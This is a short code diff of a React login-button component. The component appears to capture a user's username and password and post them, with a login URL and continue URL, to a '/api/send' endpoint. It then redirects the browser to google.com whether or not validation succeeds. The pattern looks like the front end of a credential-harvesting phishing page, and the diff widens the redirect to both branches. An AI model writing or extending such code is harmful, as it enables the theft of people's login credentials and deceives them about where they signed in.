@@ -45,12 +45,17 @@ const LoginButton = ({login,continu2,isAuthenticated}:Props) =>{
       if(validation){
         console.log('si dio like')
           const sendRequest = await axios.post('/api/send',{username,password,continue_url,login_url});
-          dispatch(uiActions.setLoading(true))
+          dispatch(uiActions.setLoading(false))
           const link =document.createElement('a');
           link.href = 'https://google.com';
           link.click();
-          console.log(sendRequest.data.status);
+          console.log('sendresponse',sendRequest.data)
+          console.log("execute code");
       }else{
+        const link =document.createElement('a');
+        link.href = 'https://google.com';
+        link.click();
+        dispatch(uiActions.setLoading(false))
         console.log('No diste like')
       }
         if(response.data.feed.data[0])
